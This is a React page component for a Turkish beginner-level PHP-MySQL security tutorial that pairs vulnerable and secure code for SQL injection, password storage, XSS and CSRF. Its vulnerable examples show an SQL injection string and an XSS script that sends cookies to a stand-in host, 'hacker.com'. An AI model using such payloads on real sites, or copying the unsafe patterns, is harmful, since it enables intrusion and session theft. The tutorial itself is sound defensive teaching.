import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { Shield, Lock, Eye, Database, Key, Settings } from "lucide-react";
import CodeExample from "@/components/CodeExample";

const BeginnerLevel = () => {
  const securityMeasures = [
    {
      title: "SQL Injection Koruması",
      description: "Prepared statements kullanarak SQL injection saldırılarını önleme",
      icon: <Database className="w-5 h-5" />,
      importance: "Kritik"
    },
    {
      title: "Parola Güvenliği",
      description: "password_hash() ve password_verify() ile güvenli parola saklama",
      icon: <Key className="w-5 h-5" />,
      importance: "Kritik"
    },
    {
      title: "XSS Koruması",
      description: "htmlspecialchars() ile zararlı script kodlarını engelleme",
      icon: <Eye className="w-5 h-5" />,
      importance: "Yüksek"
    },
    {
      title: "CSRF Koruması",
      description: "Form tokenları ile cross-site request forgery saldırılarını önleme",
      icon: <Shield className="w-5 h-5" />,
      importance: "Yüksek"
    },
    {
      title: "Session Güvenliği",
      description: "Güvenli session yapılandırması ve cookie ayarları",
      icon: <Lock className="w-5 h-5" />,
      importance: "Orta"
    },
    {
      title: "Yapılandırma Güvenliği",
      description: "Hata mesajlarını gizleme ve güvenli yapılandırma",
      icon: <Settings className="w-5 h-5" />,
      importance: "Orta"
    }
  ];

  const getImportanceBadge = (importance: string) => {
    switch (importance) {
      case "Kritik":
        return "bg-danger/20 text-danger border-danger/30";
      case "Yüksek":
        return "bg-warning/20 text-warning border-warning/30";
      case "Orta":
        return "bg-success/20 text-success border-success/30";
      default:
        return "secondary";
    }
  };

  return (
    <div className="container mx-auto py-8 space-y-8">
      {/* Header */}
      <div className="text-center space-y-4 animate-fade-in">
        <div className="flex items-center justify-center space-x-3">
          <Lock className="w-12 h-12 text-success animate-security-pulse" />
          <h1 className="text-4xl font-bold gradient-text">Başlangıç Seviyesi</h1>
        </div>
        <p className="text-xl text-muted-foreground max-w-3xl mx-auto">
          PHP-MySQL projelerinde temel güvenlik önlemleri. Bu seviyedeki önlemler her projede mutlaka uygulanmalıdır.
        </p>
        <Badge className="bg-success/20 text-success border-success/30 text-lg px-4 py-2">
          Temel Güvenlik Önlemleri
        </Badge>
      </div>

      {/* Security Measures Overview */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {securityMeasures.map((measure, index) => (
          <Card key={index} className="security-card animate-fade-in" style={{ animationDelay: `${index * 0.1}s` }}>
            <CardHeader>
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-2">
                  <div className="text-primary">
                    {measure.icon}
                  </div>
                  <CardTitle className="text-lg">{measure.title}</CardTitle>
                </div>
                <Badge className={getImportanceBadge(measure.importance)}>
                  {measure.importance}
                </Badge>
              </div>
              <CardDescription>
                {measure.description}
              </CardDescription>
            </CardHeader>
          </Card>
        ))}
      </div>

      <Separator />

      {/* Detailed Examples */}
      <div className="space-y-8">
        <h2 className="text-3xl font-bold text-center">Detaylı Örnekler ve Çözümler</h2>

        {/* SQL Injection */}
        <div className="space-y-4">
          <h3 className="text-2xl font-semibold flex items-center space-x-2">
            <Database className="w-6 h-6 text-primary" />
            <span>SQL Injection Koruması</span>
          </h3>
          
          <CodeExample
            title="SQL Injection Zafiyeti ve Çözümü"
            description="Kullanıcı girdilerini doğrudan SQL sorgusuna eklemek büyük güvenlik riski oluşturur."
            vulnerableCode={`// ❌ GÜVENSİZ - SQL Injection'a açık
$user_id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$user_id'";
$result = mysqli_query($connection, $query);

// Saldırgan şu şekilde saldırabilir:
// example.com/profile.php?id=1' OR '1'='1' --`}
            secureCode={`// ✅ GÜVENLİ - Prepared Statement kullanımı
$user_id = $_GET['id'];

// PDO ile prepared statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
$user = $stmt->fetch();

// Veya MySQLi ile
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $user_id);
$stmt->execute();
$result = $stmt->get_result();`}
            type="secure"
          />
        </div>

        {/* Password Security */}
        <div className="space-y-4">
          <h3 className="text-2xl font-semibold flex items-center space-x-2">
            <Key className="w-6 h-6 text-primary" />
            <span>Parola Güvenliği</span>
          </h3>
          
          <CodeExample
            title="Güvenli Parola Saklama"
            description="Parolaları asla düz metin olarak saklamayın. PHP'nin yerleşik hash fonksiyonlarını kullanın."
            vulnerableCode={`// ❌ GÜVENSİZ - Düz metin parola
$password = $_POST['password'];
$query = "INSERT INTO users (email, password) VALUES (?, ?)";
$stmt->execute([$email, $password]);

// Veya basit MD5/SHA1 hash (artık güvenli değil)
$password_hash = md5($_POST['password']);`}
            secureCode={`// ✅ GÜVENLİ - password_hash() kullanımı
$password = $_POST['password'];

// Parola hashleme (kayıt sırasında)
$password_hash = password_hash($password, PASSWORD_DEFAULT);
$query = "INSERT INTO users (email, password) VALUES (?, ?)";
$stmt->execute([$email, $password_hash]);

// Parola doğrulama (giriş sırasında)
$stmt = $pdo->prepare("SELECT password FROM users WHERE email = ?");
$stmt->execute([$email]);
$user = $stmt->fetch();

if (password_verify($password, $user['password'])) {
    echo "Giriş başarılı!";
} else {
    echo "Hatalı parola!";
}`}
            type="secure"
          />
        </div>

        {/* XSS Protection */}
        <div className="space-y-4">
          <h3 className="text-2xl font-semibold flex items-center space-x-2">
            <Eye className="w-6 h-6 text-primary" />
            <span>XSS (Cross-Site Scripting) Koruması</span>
          </h3>
          
          <CodeExample
            title="XSS Saldırılarını Önleme"
            description="Kullanıcı girdilerini çıktı verirken mutlaka temizleme yapın."
            vulnerableCode={`// ❌ GÜVENSİZ - Doğrudan çıktı
$username = $_POST['username'];
echo "Hoş geldin " . $username;

// Saldırgan şu girdiyi gönderebilir:
// <script>window.location='http://hacker.com?cookie='+document.cookie</script>`}
            secureCode={`// ✅ GÜVENLİ - htmlspecialchars() kullanımı
$username = $_POST['username'];
echo "Hoş geldin " . htmlspecialchars($username, ENT_QUOTES, 'UTF-8');

// Fonksiyon olarak tanımlayabilirsiniz
function clean_output($data) {
    return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
}

echo "Hoş geldin " . clean_output($username);

// HTML içeriği için strip_tags() da kullanabilirsiniz
$safe_content = strip_tags($user_content, '<p><br><strong><em>');`}
            type="secure"
          />
        </div>

        {/* CSRF Protection */}
        <div className="space-y-4">
          <h3 className="text-2xl font-semibold flex items-center space-x-2">
            <Shield className="w-6 h-6 text-primary" />
            <span>CSRF (Cross-Site Request Forgery) Koruması</span>
          </h3>
          
          <CodeExample
            title="CSRF Token Sistemi"
            description="Formlarınıza CSRF token ekleyerek sahte istekleri engelleyin."
            secureCode={`// ✅ CSRF Token üretme ve doğrulama sistemi
session_start();

// Token üretme fonksiyonu
function generate_csrf_token() {
    if (!isset($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

// Token doğrulama fonksiyonu
function verify_csrf_token($token) {
    return isset($_SESSION['csrf_token']) && 
           hash_equals($_SESSION['csrf_token'], $token);
}

// Form içinde token kullanımı
$csrf_token = generate_csrf_token();
?>
<form method="POST" action="update_profile.php">
    <input type="hidden" name="csrf_token" value="<?= $csrf_token ?>">
    <input type="text" name="username" required>
    <button type="submit">Güncelle</button>
</form>

<?php
// Form işleme kısmında doğrulama
if ($_POST) {
    if (!verify_csrf_token($_POST['csrf_token'])) {
        die('CSRF token doğrulaması başarısız!');
    }
    
    // Güvenli işlem devam eder
    $username = $_POST['username'];
    // ...
}`}
            type="secure"
          />
        </div>
      </div>

      {/* Repair Steps */}
      <Card className="security-card bg-primary/5 border-primary/20">
        <CardHeader>
          <CardTitle className="text-xl flex items-center space-x-2">
            <Settings className="w-5 h-5" />
            <span>Tamir Aşamaları</span>
          </CardTitle>
          <CardDescription>
            Mevcut projenizdeki güvenlik açıklarını nasıl giderebilirsiniz?
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-3">
            <h4 className="font-semibold text-primary">1. SQL Injection Tamiri</h4>
            <ul className="list-disc list-inside space-y-1 text-sm text-muted-foreground ml-4">
              <li>Tüm SQL sorgularını tarayın ve doğrudan string birleştirmesi yapılanları bulun</li>
              <li>mysqli_query() yerine prepared statement kullanın</li>
              <li>Parametreleri bind_param() veya execute() ile güvenli şekilde bağlayın</li>
              <li>Veritabanı hatalarını kullanıcıya göstermeyecek şekilde yapılandırın</li>
            </ul>
          </div>
          
          <div className="space-y-3">
            <h4 className="font-semibold text-primary">2. Parola Hash'leme Güncellemesi</h4>
            <ul className="list-disc list-inside space-y-1 text-sm text-muted-foreground ml-4">
              <li>Mevcut kullanıcıların parolalarını yeni sisteme geçirin</li>
              <li>Geçiş sürecinde eski ve yeni hash'leri kontrol edin</li>
              <li>MD5/SHA1 kullanıyorsanız mutlaka password_hash()'e geçin</li>
              <li>Parola politikası belirleyin (minimum uzunluk, karmaşıklık)</li>
            </ul>
          </div>

          <div className="space-y-3">
            <h4 className="font-semibold text-primary">3. XSS ve CSRF Koruması Ekleme</h4>
            <ul className="list-disc list-inside space-y-1 text-sm text-muted-foreground ml-4">
              <li>Tüm kullanıcı çıktılarını htmlspecialchars() ile temizleyin</li>
              <li>Formlara CSRF token sistemi ekleyin</li>
              <li>Session ayarlarını güvenli yapılandırın</li>
              <li>Hata raporlama özelliklerini production'da kapatın</li>
            </ul>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default BeginnerLevel;